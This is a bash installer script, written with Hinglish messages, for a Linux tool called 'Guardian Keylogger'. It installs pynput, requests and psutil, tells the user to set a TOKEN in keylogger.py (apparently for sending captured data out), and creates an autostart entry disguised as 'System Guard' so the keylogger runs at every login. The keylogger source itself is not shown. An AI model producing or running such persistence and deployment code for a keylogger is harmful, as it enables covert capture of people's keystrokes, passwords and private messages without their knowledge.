cat > install.sh << 'EOF'
#!/bin/bash
echo "====================================="
echo "   Guardian Keylogger Installer (Linux)"
echo "====================================="

echo "Dependencies install kar raha hoon..."
sudo apt install xdotool -y

python3 -m venv venv
source venv/bin/activate
pip install pynput requests psutil

echo ""
echo "✅ Dependencies install ho gaye!"
echo ""
echo "Ab keylogger.py mein TOKEN check/edit karo"
echo ""
read -p "Press Enter to continue..."

mkdir -p \~/.config/autostart
cat > \~/.config/autostart/guardian-keylogger.desktop << EOC
[Desktop Entry]
Type=Application
Name=System Guard
Exec=$(pwd)/venv/bin/python3 $(pwd)/keylogger.py
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
EOC

echo ""
echo "✅ Setup complete!"
echo "Test: source venv/bin/activate && python3 keylogger.py"
EOF
